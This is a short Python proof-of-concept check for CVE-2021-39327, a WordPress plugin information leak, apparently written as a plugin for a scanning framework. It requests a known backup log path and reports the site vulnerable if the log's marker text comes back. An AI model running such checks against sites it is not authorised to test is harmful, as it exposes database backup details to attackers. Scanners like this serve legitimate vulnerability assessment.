# title: WordPress 插件信息泄露漏洞
# id： CVE-2021-39327
# author: sjy

from poctools import BasicPoc


class POC(BasicPoc):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    }
    path = '/wp-content/bps-backup/logs/db_backup_log.txt'

    def __init__(self):
        super(POC, self).__init__()
        self.name = "WordPress 插件信息泄露漏洞"

    def verify(self, url: str) -> bool:
        try:
            main_url = url + self.path
            resp = self.get(url=main_url, headers=self.headers, verify=False, timeout=5)
            if resp.status_code == 200 and 'BPS DB BACKUP LOG' in resp.text and '=====' in resp.text:
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    target = 'https://127.0.0.1:443'
    tp = POC()
    result = tp.run(url=target)
    print(f'{target} -> {result}')